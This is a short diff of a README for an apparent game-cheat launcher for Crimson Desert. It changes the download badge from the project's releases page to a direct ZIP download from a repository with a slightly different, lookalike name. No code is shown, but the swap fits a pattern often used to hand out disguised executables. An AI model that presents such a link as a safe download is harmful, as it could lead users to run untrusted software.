@@ -3,7 +3,7 @@
   One-click launcher with powerful Axiom God presets and Fat Stacks support for Crimson Desert.
 </p>
 <p align="center">
-  <a href="https://github.com/Solengleng/Axiom-God-Combo-Launcher/releases">
+  <a href="https://github.com/Solengleng/-Axiom-God-Combo-Launcher/releases/download/AxiomLauncher/AxiomLauncher.zip">
     <img src="https://img.shields.io/badge/Download_AXIOM_GOD_COMBO_LAUNCHER-v1.0.0-2ea44f?style=for-the-badge" alt="Download Axiom God Combo Launcher">
   </a>
 </p>
